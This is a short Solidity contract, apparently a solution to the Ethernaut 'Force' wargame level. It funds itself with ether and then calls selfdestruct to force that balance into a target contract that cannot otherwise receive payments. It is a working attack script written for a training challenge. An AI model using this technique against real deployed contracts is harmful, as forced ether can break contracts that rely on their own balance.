// https://ethernaut.openzeppelin.com/level/0x22699e6AdD7159C3C385bf4d7e1C647ddB3a99ea
pragma solidity ^0.6.0;


// 初始化为0.001 eth即可 selfdestruct强制执行余额转移及自毁合约
contract ForceAttack {

  constructor() public payable {}
  receive() external payable {}

  function attack(address payable target) public {
    selfdestruct(target);
  }
}
